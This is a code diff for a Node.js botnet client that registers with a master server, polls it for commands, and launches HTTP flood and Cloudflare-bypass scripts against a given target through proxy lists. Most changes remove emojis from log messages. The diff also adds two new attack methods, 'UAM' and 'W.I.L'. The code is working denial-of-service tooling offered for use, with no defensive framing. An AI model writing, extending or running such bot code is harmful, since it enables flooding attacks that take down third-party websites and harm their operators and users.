@@ -21,21 +21,21 @@ async function fetchData() {
     myBotUrl = `http://${data.origin}:${port}`;
     
     console.log('\n========================================');
-    console.log('🤖 Auto-Register Bot Client Started!');
+    console.log('Auto-Register Bot Client Started!');
     console.log('========================================');
-    console.log(`📍 Local:    http://localhost:${port}`);
-    console.log(`🌐 Network:  ${myBotUrl}`);
+    console.log(`Local:    http://localhost:${port}`);
+    console.log(`Network:  ${myBotUrl}`);
     console.log('========================================');
-    console.log(`🎯 Master Server: ${MASTER_SERVER}`);
-    console.log(`🔄 Auto-registration: ENABLED`);
-    console.log(`💓 Heartbeat: Every 30 seconds`);
+    console.log(`Master Server: ${MASTER_SERVER}`);
+    console.log(`Auto-registration: ENABLED`);
+    console.log(`Heartbeat: Every 30 seconds`);
     console.log('========================================\n');
     
     return data;
   } catch (error) {
     myBotUrl = `http://localhost:${port}`;
-    console.log(`🤖 Bot running at ${myBotUrl}`);
-    console.log(`🎯 Master Server: ${MASTER_SERVER}`);
+    console.log(`Bot running at ${myBotUrl}`);
+    console.log(`Master Server: ${MASTER_SERVER}`);
   }
 }
 
@@ -70,10 +70,10 @@ async function autoRegister() {
     });
 
     if (response.data.approved) {
-      console.log(`[SUCCESS] ✅ Auto-approved by master server!`);
+      console.log(`[SUCCESS] Auto-approved by master server!`);
       console.log(`[INFO] Bot registered at: ${myBotUrl}`);
       console.log(`[INFO] Ready to receive attack commands!`);
-      console.log(`[INFO] Status: 🟢 ONLINE\n`);
+      console.log(`[INFO] Status: ONLINE\n`);
       
       // Fast command polling - check every 3 seconds for instant response
       setInterval(() => {
@@ -91,7 +91,7 @@ async function autoRegister() {
     // Check if bot is blocked (403 status)
     if (error.response && error.response.status === 403) {
       console.log(`\n========================================`);
-      console.log(`[BLOCKED] ❌ This bot has been permanently blocked!`);
+      console.log(`[BLOCKED] This bot has been permanently blocked!`);
       console.log(`========================================`);
       console.log(`Bot URL: ${myBotUrl}`);
       console.log(`Reason: Server administrator blocked this bot`);
@@ -117,9 +117,9 @@ async function autoRegister() {
 async function sendHeartbeat() {
   try {
     await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
-    console.log(`[HEARTBEAT] 💓 Sent to master | Status: 🟢 ONLINE`);
+    console.log(`[HEARTBEAT] Sent to master | Status: ONLINE`);
   } catch (error) {
-    console.log(`[WARN] Heartbeat failed | Status: 🔴 OFFLINE`);
+    console.log(`[WARN] Heartbeat failed | Status: OFFLINE`);
     console.log(`[INFO] Re-registering with master...`);
     registrationAttempts = 0;
     autoRegister();
@@ -138,11 +138,11 @@ async function checkForCommands() {
       const command = response.data.command;
       
       if (command.action === 'stop') {
-        console.log(`\n[STOP-RECEIVED] 🛑 Stopping all attacks`);
+        console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
         stopAllAttacks();
       } else if (command.action === 'attack') {
         const { target, time, methods } = command;
-        console.log(`\n[COMMAND-RECEIVED] 🚀 ${methods} -> ${target} for ${time}s`);
+        console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
         executeAttack(target, time, methods);
       }
     }
@@ -158,14 +158,14 @@ function stopAllAttacks() {
   activeProcesses.forEach(proc => {
     try {
       process.kill(-proc.pid); // Kill process group
-      console.log(`[KILLED] ✓ Process ${proc.pid}`);
+      console.log(`[KILLED] Process ${proc.pid}`);
     } catch (error) {
       console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
     }
   });
   
   activeProcesses = [];
-  console.log(`[STOP] ✅ All attacks stopped\n`);
+  console.log(`[STOP] All attacks stopped\n`);
 }
 
 // Execute attack methods
@@ -194,27 +194,27 @@ function executeAttack(target, time, methods) {
   };
 
   if (methods === 'CF-BYPASS') {
-    console.log('✅ Executing CF-BYPASS');
+    console.log('[OK] Executing CF-BYPASS');
     execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
   }
   else if (methods === 'MODERN-FLOOD') {
-    console.log('✅ Executing MODERN-FLOOD');
+    console.log('[OK] Executing MODERN-FLOOD');
     execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
   }
   else if (methods === 'HTTP-SICARIO') {
-    console.log('✅ Executing HTTP-SICARIO');
+    console.log('[OK] Executing HTTP-SICARIO');
     execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
     execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
   } 
   else if (methods === 'RAW-HTTP') {
-    console.log('✅ Executing RAW-HTTP');
+    console.log('[OK] Executing RAW-HTTP');
     execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
   } 
   else if (methods === 'R9') {
-    console.log('✅ Executing R9');
+    console.log('[OK] Executing R9');
     execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
     execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
@@ -222,7 +222,7 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
   } 
   else if (methods === 'PRIV-TOR') {
-    console.log('✅ Executing PRIV-TOR');
+    console.log('[OK] Executing PRIV-TOR');
     execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
     execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
@@ -230,11 +230,11 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
   } 
   else if (methods === 'HOLD-PANEL') {
-    console.log('✅ Executing HOLD-PANEL');
+    console.log('[OK] Executing HOLD-PANEL');
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
   } 
   else if (methods === 'R1') {
-    console.log('✅ Executing R1');
+    console.log('[OK] Executing R1');
     execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
     execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
     execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
@@ -244,8 +244,16 @@ function executeAttack(target, time, methods) {
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
   }
+  else if (methods === 'UAM') {
+    console.log('[OK] Executing UAM');
+    execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
+  }
+  else if (methods === 'W.I.L') {
+    console.log('[OK] Executing W.I.L - Web Intensive Load');
+    execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
+  }
   else {
-    console.log(`❌ Unknown method: ${methods}`);
+    console.log(`[ERROR] Unknown method: ${methods}`);
   }
 }
 
